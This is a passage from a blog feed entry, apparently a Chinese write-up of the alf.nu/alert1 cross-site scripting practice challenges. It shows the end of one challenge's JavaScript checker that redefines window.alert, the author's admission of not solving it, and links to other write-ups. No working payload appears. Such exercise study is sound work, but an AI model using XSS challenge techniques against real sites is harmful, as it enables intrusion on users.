<span class="comment">// games, so why not have one here?</span></span><br><span class="line">    <span class="keyword">var</span> win = alert;</span><br><span class="line">    <span class="built_in">window</span>.alert = <span class="function"><span class="keyword">function</span>(<span class="params">t</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (t === s)</span><br><span class="line">            win(<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">"Alert: "</span> + t + <span class="string">"\n(That's not a quine)"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这题很有意思。可惜我不会啊。<br><br><br><br><br><br>参考<a href="http://www.pwntester.com/blog/2014/01/06/escape-alf-nu-xss-challenges-write-ups-part-148/" target="_blank" rel="noopener">博客-上</a></p><p>参考<a href="http://www.pwntester.com/blog/2014/01/08/escape-alf-nu-xss-challenges-write-ups-part-257/" target="_blank" rel="noopener">博客-下</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;这些天在&lt;a href=&quot;https://alf.nu/alert1&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;alf.nu/alert1&lt;/a&gt;上做了XSS练习题，目前大部分做出来了，但有些题目并不是最优解。还剩下2道题没有做出（Fruit3, Qunie），在此做个记录。欢迎大家交流。&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
</feed>
